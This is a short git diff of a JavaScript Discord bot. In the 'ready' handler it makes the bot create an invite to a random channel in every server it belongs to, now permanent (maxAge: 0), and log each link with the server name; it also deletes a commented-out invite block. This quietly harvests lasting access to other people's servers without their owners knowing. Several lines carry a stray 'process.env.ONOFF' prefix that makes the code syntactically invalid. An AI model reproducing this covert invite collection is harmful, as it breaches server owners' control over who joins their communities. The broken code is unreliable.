@@ -25,7 +25,7 @@ bot.on('ready', () => {
    
   process.env.ONOFF bot.guilds.forEach(guild => { 
   process.env.ONOFF    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-  process.env.ONOFF    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
+  process.env.ONOFF    invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
   process.env.ONOFF  })
    
  });
@@ -62,16 +62,6 @@ bot.on('message', message => {
    message.guild.createEmoji('./mikado3.gif', 'mikado3')
   .then(emoji => console.log(`Nouveau emoji crée ! ${emoji.name}`))
       }
-   
-   
-   
-   //message.channel.createInvite({maxAge: 0, maxUses: 0}).then(invite => {
-    //let embed = new Discord.RichEmbed()
-    //.setColor(color)
-   // .console.log(`**Permanent Invite Link**: ${invite}`);
-   // message.channel.send(embed);
- // });
-//}
    
 });
   
